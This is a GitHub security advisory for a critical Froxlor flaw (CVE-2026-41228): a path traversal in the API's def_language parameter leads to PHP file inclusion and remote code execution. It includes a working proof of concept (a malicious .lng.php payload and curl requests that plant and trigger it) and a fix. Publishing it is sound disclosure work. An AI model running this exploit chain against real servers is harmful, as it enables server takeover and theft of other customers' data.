# [C] Froxlor has Local File Inclusion via path traversal in API `def_language` parameter leads to Remote Code Execution

## Summary
Severity: Critical
Advisory: GHSA-w59f-67xm-rxx7
CVE: CVE-2026-41228
CWE: CWE-98
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-w59f-67xm-rxx7
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.3.6

## Details
## Summary

The Froxlor API endpoint `Customers.update` (and `Admins.update`) does not validate the `def_language` parameter against the list of available language files. An authenticated customer can set `def_language` to a path traversal payload (e.g., `../../../../../var/customers/webs/customer1/evil`), which is stored in the database. On subsequent requests, `Language::loadLanguage()` constructs a file path using this value and executes it via `require`, achieving arbitrary PHP code execution as the web server user.

## Details

**Root cause:** The API and web UI have inconsistent validation for the `def_language` parameter.

The **web UI** (`customer_index.php:261`, `admin_index.php:265`) correctly validates `def_language` against `Language::getLanguages()`, which scans the `lng/` directory for actual language files:

```php
// customer_index.php:260-265
$def_language = Validate::validate(Request::post('def_language'), 'default language');
if (isset($languages[$def_language])) {
    Customers::getLocal($userinfo, [
        'id' => $userinfo['customerid'],
        'def_language' => $def_language
    ])->update();
```

The **API** (`Customers.php:1207`, `Admins.php:600`) only runs `Validate::validate()` with the default regex `/^[^\r\n\t\f\0]*$/D`, which permits path traversal sequences:

```php
// Customers.php:1167-1172 (customer branch)
} else {
    // allowed parameters
    $def_language = $this->getParam('def_language', true, $result['def_language']);
    ...
}
// Customers.php:1207 - validation (shared by admin and customer paths)
$def_language = Validate::validate($def_language, 'default language', '', '', [], true);
```

The tainted value is stored in the `panel_customers` (or `panel_admins`) table. On every subsequent request, it is loaded and used in two paths:

**API path** (`ApiCommand.php:218-222`):
```php
private function initLang()
{
    Language::setLanguage(Settings::Get('panel.standardlanguage'));
    if ($this->getUserDetail('language') !== null && isset(Language::getLanguages()[$this->getUserDetail('language')])) {
        Language::setLanguage($this->getUserDetail('language'));
    } elseif ($this->getUserDetail('def_language') !== null) {
        Language::setLanguage($this->getUserDetail('def_language')); // No validation
    }
}
```

**Web path** (`init.php:180-185`):
```php
if (CurrentUser::hasSession()) {
    if (!empty(CurrentUser::getField('language')) && isset(Language::getLanguages()[CurrentUser::getField('language')])) {
        Language::setLanguage(CurrentUser::getField('language'));
    } else {
        Language::setLanguage(CurrentUser::getField('def_language')); // No validation
    }
}
```

The `language` session field is `null` for API requests and empty on fresh web logins, so both paths fall through to the unvalidated `def_language`.

**File inclusion** (`Language.php:89-98`):
```php
private static function loadLanguage($iso): array
{
    $languageFile = dirname(__DIR__, 2) . sprintf('/lng/%s.lng.php', $iso);
    if (!file_exists($languageFile)) {
        return [];
    }
    $lng = require $languageFile;  // Arbitrary PHP execution
```

With `$iso = '../../../../../var/customers/webs/customer1/evil'`, the path resolves to `/var/customers/webs/customer1/evil.lng.php`, escaping the `lng/` directory.

## PoC

**Step 1 — Upload malicious language file via FTP:**

Froxlor customers have FTP access to their web directory by default (`api_allowed` defaults to `1` in the schema).

```bash
# Create malicious .lng.php file
echo '<?php system("id > /tmp/pwned"); return [];' > evil.lng.php

# Upload to customer web directory via FTP
ftp panel.example.com
> put evil.lng.php
```

The file is now at `/var/customers/webs/<loginname>/evil.lng.php`.

**Step 2 — Set traversal payload via API:**

```bash
curl -s -X POST https://panel.example.com/api \
  -H 'Authorization: Basic <base64(apikey:apisecret)>' \
  -d '{"command":"Customers.update","params":{"def_language":"../../../../../var/customers/webs/customer1/evil"}}'
```

The traversal path is stored in the database. The `.lng.php` suffix is appended automatically by `Language::loadLanguage()`.

**Step 3 — Trigger inclusion on next API call:**

```bash
curl -s -X POST https://panel.example.com/api \
  -H 'Authorization: Basic <base64(apikey:apisecret)>' \
  -d '{"command":"Customers.get"}'
```

`ApiCommand::initLang()` loads `def_language` from the database and passes it to `Language::setLanguage()` → `loadLanguage()` → `require /var/customers/webs/customer1/evil.lng.php`.

**Step 4 — Verify execution:**

```bash
cat /tmp/pwned
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Impact

An authenticated customer can execute arbitrary PHP code as the web server user. This enables:

- **Full server compromise:** Read `lib/userdata.inc.php` to obtain database credentials, then access all customer data, admin credentials, and server configuration.
- **Lateral movement:** Access other customers' databases, email, and files from the shared hosting environment.
- **Persistent backdoor:** Modify Froxlor source files or cron configurations to maintain access.
- **Data exfiltration:** Read all hosted databases and email content across the panel.

The attack is practical because Froxlor is a hosting panel where customers have FTP access by default, and API access is enabled by default (`api_allowed` = 1). The `.lng.php` suffix constraint is not a meaningful barrier since the attacker controls file creation in their web directory.

## Recommended Fix

Validate `def_language` against the actual language file list in the API endpoints, matching the web UI behavior:

```php
// In Customers.php, replace line 1207:
// $def_language = Validate::validate($def_language, 'default language', '', '', [], true);

// With:
$def_language = Validate::validate($def_language, 'default language', '', '', [], true);
if (!empty($def_language) && !isset(Language::getLanguages()[$def_language])) {
    $def_language = Settings::Get('panel.standardlanguage');
}
```

Apply the same fix in `Admins.php` at line 600.

Additionally, add a defensive check in `Language::loadLanguage()` to prevent path traversal:

```php
private static function loadLanguage($iso): array
{
    // Reject path traversal attempts
    if ($iso !== basename($iso) || str_contains($iso, '..')) {
        return [];
    }
    $languageFile = dirname(__DIR__, 2) . sprintf('/lng/%s.lng.php', $iso);
    // ...
}
```

## References
- https://github.com/froxlor/froxlor/security/advisories/GHSA-w59f-67xm-rxx7
- https://nvd.nist.gov/vuln/detail/CVE-2026-41228
- https://github.com/froxlor/froxlor/commit/bc5e6dbaa90e6f3573129da640595e8c770e1d0c
- https://github.com/froxlor/froxlor
- https://github.com/froxlor/froxlor/releases/tag/2.3.6
